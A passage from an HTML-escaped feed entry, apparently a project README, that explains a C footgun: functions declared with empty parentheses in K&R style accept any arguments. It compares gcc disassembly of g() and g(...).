class=&#34;language-C&#34;&gt;f();&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then you just found a footgun! That actually signals how the function takes... well, we don&#39;t know what it takes, so better allow anything! Take a look at &lt;code&gt;g&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;g() int; int; { int; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Ignoring those &lt;code&gt;int&lt;/code&gt;s, one could assume it takes 0 arguments, yet if you glimpse at how it&#39;s called:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;g(i = h = j = k)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You will see how passing one int is valid, in fact, it doesn&#39;t even warrant a warning! This, again routes from the K&amp;amp;R style, where as established before, arguments where not expected to be type checked.&lt;/p&gt; &#xA;&lt;p&gt;Sooo, is &lt;code&gt;g()&lt;/code&gt; equivalent to &lt;code&gt;g(...)&lt;/code&gt;? No! For one, &lt;code&gt;...&lt;/code&gt; required a named argument before itself until C2X. However, in the case of &lt;code&gt;g()&lt;/code&gt; the compiler not required to perform type promotions. Also, the generated assembly is... strange. That&#39;s what &lt;code&gt;g().c&lt;/code&gt; and &lt;code&gt;g(...).c&lt;/code&gt; are here for. Here is the relevant part of their disassembly:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Asm&#34;&gt;// @BAKE gcc -g -O0 &#34;$@&#34; -o &#34;$*&#34;                                |  // @BAKE gcc -g -O0 &#34;$@&#34; -o &#34;$*&#34; -Wall -Wpedantic&#xA;&#xA;g() {                                                           |  g(...) {&#xA;    1129:       f3 0f 1e fa             endbr64                        1129:       f3 0f 1e fa             endbr64&#xA;    112d:       55                      push   %rbp                    112d:       55                      push   %rbp&#xA;    112e:       48 89 e5                mov    %rsp,%rbp               112e:       48 89 e5                mov    %rsp,%rbp&#xA;                                                                &amp;gt;      1131:       48 83 ec 38             sub    $0x38,%rsp&#xA;                                                                &amp;gt;      1135:       48 89 bd 50 ff ff ff    mov    %rdi,-0xb0(%rbp)&#xA;                                                                &amp;gt;      113c:       48 89 b5 58 ff ff ff    mov    %rsi,-0xa8(%rbp)&#xA;                                                                &amp;gt;      1143:       48 89 95 60 ff ff ff    mov    %rdx,-0xa0(%rbp)&#xA;                                                                &amp;gt;      114a:       48 89 8d 68 ff ff ff    mov    %rcx,-0x98(%rbp)&#xA;                                                                &amp;gt;      1151:       4c 89 85 70 ff ff ff    mov    %r8,-0x90(%rbp)&#xA;                                                                &amp;gt;      1158:       4c 89 8d 78 ff ff ff    mov    %r9,-0x88(%rbp)&#xA;                                                                &amp;gt;      115f:       84 c0                   test   %al,%al&#xA;                                                                &amp;gt;      1161:       74 20                   je     1183 &amp;lt;g+0x5a&amp;gt;&#xA;                                                                &amp;gt;      1163:       0f 29 45 80             movaps %xmm0,-0x80(%rbp&#xA;                                                                &amp;gt;      1167:       0f 29 4d 90             movaps %xmm1,-0x70(%rbp&#xA;                                                                &amp;gt;      116b:       0f 29 55 a0             movaps %xmm2,-0x60(%rbp&#xA;                                                                &amp;gt;      116f:       0f 29 5d b0             movaps %xmm3,-0x50(%rbp&#xA;                                                                &amp;gt;      1173:       0f 29 65 c0             movaps %xmm4,-0x40(%rbp&#xA;                                                                &amp;gt;      1177:       0f 29 6d d0             movaps %xmm5,-0x30(%rbp&#xA;                                                                &amp;gt;      117b:       0f 29 75 e0             movaps %xmm6,-0x20(%rbp&#xA;                                                                &amp;gt;      117f:       0f 29 7d f0             movaps %xmm7,-0x10(%rbp&#xA;        return 2;                                                          return 2;&#xA;    1131:       b8 02 00 00 00          mov    $0x2,%eax        |      1183:       b8 02 00 00 00          mov    $0x2,%eax&#xA;}                                                                  }&#xA;    1136:       5d                      pop    %rbp             |      1188:       c9                      leave&#xA;    1137:       c3                      ret                     |      1189:       c3                      ret&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On the right side, &lt;code&gt;g(...)&lt;/code&gt; actually reads a bunch of values from the stack into registers. What I &lt;em&gt;think&lt;/em&gt; is happening is that the compiler would really like to optimize arguments being read from the stack directly, but since -O0 was on, it was not allowed to make any assumptions about, how &lt;code&gt;g&lt;/code&gt; will be called, hence it loads as much as it can.&lt;/p&gt; &#xA;&lt;p&gt;(If you know better, please correct me!)&lt;/p&gt; &#xA;&lt;h2&gt;Challange&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Try to make the project worse&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>